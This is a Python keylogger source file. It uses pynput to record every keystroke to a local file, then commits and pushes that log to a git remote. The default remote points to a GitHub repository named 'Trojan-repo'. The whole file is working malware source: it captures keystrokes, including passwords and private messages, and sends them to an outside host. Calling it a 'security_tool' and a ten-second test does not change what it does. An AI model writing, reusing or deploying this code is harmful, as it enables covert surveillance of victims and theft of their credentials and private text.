from pynput import keyboard
from datetime import datetime
import time
import subprocess



class Keylogger:
    def __init__(self, log_file="keylog.txt", repo_path= "https://raw.githubusercontent.com/BlertaJashanica/Trojan-repo/main/data/"):
        self.log_file = log_file
        self.repo_path = repo_path
        self.log = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            # Register character keys (e.g., letters, numbers)
            self.log.append(key.char)
        except AttributeError:
            # Register special keys (e.g., Enter, Shift)
            self.log.append(f"[{key}]")

        # Write each keystroke directly to the log file
        try:
            with open(self.log_file, "a") as f:
                f.write(self.log[-1])  # Write the last logged key
        except Exception as e:
            self.log_error(f"Error writing to log file: {e}")

    def start(self):
        # Initialize log file with a start message
        try:
            with open(self.log_file, "w") as f:
                f.write("Keylogger started\n")
        except Exception as e:
            self.log_error(f"Error initializing log file: {e}")
        # Start listening for key presses
        self.listener.start()

    def stop(self):
        # Stop the listener when finished
        self.listener.stop()
        # Push the updated log file to GitHub
        self.push_to_github()

    def push_to_github(self):
        """Pushes the log file to a GitHub repository."""
        try:
            subprocess.run(["git", "-C", self.repo_path, "add", self.log_file], check=True)
            subprocess.run(["git", "-C", self.repo_path, "commit", "-m", "Update keylog file"], check=True)
            subprocess.run(["git", "-C", self.repo_path, "push"], check=True)
            print("Log file pushed to GitHub repository.")
        except subprocess.CalledProcessError as e:
            self.log_error(f"Git operation failed: {e}")
        except Exception as e:
            self.log_error(f"Unexpected error during Git operation: {e}")

    @staticmethod
    def log_error(message):
        """Logs errors to a dedicated error file."""
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"{datetime.now()}: {message}\n")

# Replace "./" with the path to your local Git repository
repo_path = "./"
security_tool = Keylogger(repo_path=repo_path)

print("Starting keylogger (run for 10 seconds)...")
security_tool.start()

print("Keylogger is running... Press keys to test it.")

# Run the keylogger for 10 seconds for testing purposes
time.sleep(10)

# Stop the keylogger and end the program
security_tool.stop()
